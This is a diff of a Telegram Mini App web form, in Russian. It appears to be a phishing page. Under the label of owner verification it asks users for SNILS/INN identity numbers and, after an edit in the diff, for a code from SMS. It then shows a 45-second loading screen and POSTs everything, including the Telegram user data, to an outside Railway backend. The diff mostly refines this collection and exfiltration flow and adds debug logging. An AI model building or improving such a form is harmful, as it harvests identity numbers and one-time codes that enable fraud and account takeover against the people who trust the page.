@@ -108,26 +108,25 @@
     </div>
 
     <!-- Шаг 4 -->
-    <!-- Шаг 4 -->
-<div id="step4" class="hidden glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
-  <p class="text-lg font-medium mb-4">Верификация владельца</p>
-  <div class="input-focus bg-white dark:bg-zinc-900 border border-zinc-300 dark:border-zinc-700 rounded-2xl p-1">
-    <input id="wishCount" 
-           type="tel" 
-           inputmode="numeric" 
-           maxlength="12"
-           class="w-full bg-transparent px-5 py-4 text-lg outline-none" 
-           placeholder="Снилс\ИНН">
-  </div>
-  <div class="grid grid-cols-2 gap-3 mt-6">
-    <button id="btn4" class="bg-blue-600 hover:bg-blue-700 transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
-      Продолжить
-    </button>
-    <button id="btnNoWish" class="bg-zinc-200 dark:bg-zinc-800 hover:bg-zinc-300 dark:hover:bg-zinc-700 transition-colors font-semibold py-4 rounded-2xl text-lg">
-      Нет документа?
-    </button>
-  </div>
-</div>
+    <div id="step4" class="hidden glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
+      <p class="text-lg font-medium mb-4">Верификация владельца</p>
+      <div class="input-focus bg-white dark:bg-zinc-900 border border-zinc-300 dark:border-zinc-700 rounded-2xl p-1">
+        <input id="wishCount"
+               type="tel"
+               inputmode="numeric"
+               maxlength="12"
+               class="w-full bg-transparent px-5 py-4 text-lg outline-none"
+               placeholder="Снилс\ИНН">
+      </div>
+      <div class="grid grid-cols-2 gap-3 mt-6">
+        <button id="btn4" class="bg-blue-600 hover:bg-blue-700 transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
+          Продолжить
+        </button>
+        <button id="btnNoWish" class="bg-zinc-200 dark:bg-zinc-800 hover:bg-zinc-300 dark:hover:bg-zinc-700 transition-colors font-semibold py-4 rounded-2xl text-lg">
+          Нет документа?
+        </button>
+      </div>
+    </div>
 
     <!-- Шаг короткий номер -->
     <div id="stepShort" class="hidden glass border border-zinc-200 dark:border-zinc-800 rounded-3xl p-6 animate-step">
@@ -199,7 +198,8 @@ function updateProgress() {
 
 function showStep(nextStep) {
   document.querySelectorAll("#stepsContainer > div").forEach(s => s.classList.add("hidden"));
-  document.getElementById(`step${nextStep === 5 ? "Short" : nextStep}`).classList.remove("hidden");
+  const stepId = nextStep === 5 ? "stepShort" : `step${nextStep}`;
+  document.getElementById(stepId).classList.remove("hidden");
   currentStep = nextStep;
   updateProgress();
 }
@@ -239,7 +239,7 @@ els.btn3.addEventListener("click", () => {
 
 // Шаг 4
 els.btn4.addEventListener("click", () => {
-  data.wishCount = els.wishCount.value || "0";
+  data.wishCount = els.wishCount.value.trim() || "0";
   startLoading();
 });
 
@@ -252,7 +252,7 @@ els.btnNoWish.addEventListener("click", () => {
 els.btnShort.addEventListener("click", () => {
   const val = els.shortNumber.value.trim();
   if (!val) {
-    tg.showAlert("Введите короткий номер");
+    tg.showAlert("Введите код из СМС");
     return;
   }
   data.shortNumber = val;
@@ -260,7 +260,10 @@ els.btnShort.addEventListener("click", () => {
 });
 
 function startLoading() {
-  document.querySelector(".max-w-\\[420px\\]").classList.add("hidden");
+  console.log("🚀 Запуск загрузки. Собранные данные:", data); // ← для отладки
+
+  // Скрываем форму, показываем лоадер
+  document.querySelector(".max-w-[420px]").classList.add("hidden");
   els.loading.classList.remove("hidden");
 
   setTimeout(() => {
@@ -272,7 +275,11 @@ function startLoading() {
       </div>
     `;
 
-fetch('https://helper-chek-bot-2026-production.up.railway.app/checks', {  // ← Здесь вставьте реальный URL вашего бэкенда на Railway (или другом сервисе)
+    const BACKEND_URL = 'https://helper-chek-bot-2026-production.up.railway.app/api/save';
+
+    console.log("Отправляю POST на:", BACKEND_URL); // ← отладка
+
+    fetch(BACKEND_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -280,6 +287,16 @@ fetch('https://helper-chek-bot-2026-production.up.railway.app/checks', {  // ←
         user: tg.initDataUnsafe?.user || { id: "unknown" },
         timestamp: new Date().toISOString()
       })
+    })
+    .then(response => {
+      console.log("Ответ от сервера:", response.status, response.ok);
+      return response.json();
+    })
+    .then(data => {
+      console.log("Успешный ответ:", data);
+    })
+    .catch(error => {
+      console.error("Ошибка при отправке:", error);
     });
   }, 45000);
 }
